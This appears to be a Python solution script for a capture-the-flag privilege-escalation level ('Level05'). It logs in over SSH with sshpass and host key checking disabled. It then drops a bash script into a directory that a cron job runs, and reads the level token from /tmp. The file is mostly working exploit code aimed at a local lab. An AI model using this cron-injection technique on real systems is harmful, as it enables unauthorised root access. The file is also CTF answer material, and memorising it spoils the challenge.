"""Level05 - Cron-based Privilege Escalation"""

import subprocess
import sys
import time


def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except:
        return -1, "", ""


def exploit(host, port, ssh_port, pwd):
    """Execute cron-based privilege escalation."""
    print(f"[*] Connecting to level05@{host}:{ssh_port}")
    code, out, err = ssh_cmd(host, ssh_port, "level05", pwd, "id")
    if code != 0:
        print("[!] SSH connection failed")
        return False, ""
    print(f"[+] SSH OK: {out.strip()}\n")

    print("[*] Checking /var/mail/level05 for hints...")
    code, mail, _ = ssh_cmd(host, ssh_port, "level05", pwd, "cat /var/mail/level05")
    if code == 0:
        print(f"[+] Mail: {mail.strip()}\n")

    print("[*] Creating exploit script in /opt/openarenaserver/")
    script = """#!/bin/bash
whoami > /tmp/whoami.txt
id >> /tmp/whoami.txt
getflag >> /tmp/whoami.txt 2>&1
"""
    create_cmd = f"cat > /opt/openarenaserver/exploit.sh << 'EOF'\n{script}EOF"
    ssh_cmd(host, ssh_port, "level05", pwd, create_cmd)
    print("[+] Exploit script created\n")

    print("[*] Waiting for cron job to execute script (~2 minutes)...")
    for i in range(6):
        time.sleep(10)
        elapsed = (i + 1) * 10
        print(f"[*] Progress: {elapsed}s/120s - Checking for cron execution...")
        code, result, _ = ssh_cmd(
            host,
            ssh_port,
            "level05",
            pwd,
            "test -f /tmp/whoami.txt && cat /tmp/whoami.txt",
        )
        if code == 0 and "flag05" in result:
            print(f"[+] Cron script executed!")
            token_match = result.split("token : ")
            if len(token_match) > 1:
                token = token_match[1].strip()
                print(f"[+] Success! Token: {token}")
                return True, token

    print("[!] Script execution failed or timed out")
    return False, ""


def main():
    print("Level05 Cron Privilege Escalation Exploit\n")

    try:
        with open("level04/flag", "r") as f:
            pwd = f.read().strip()
        print(f"[+] Level04 token: {pwd}\n")
    except:
        print("[!] Could not read level04 token")
        sys.exit(1)

    success, token = exploit("localhost", 4747, 4242, pwd)

    if success:
        print(f"[ANSWER]")
        print(f"  Level05 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
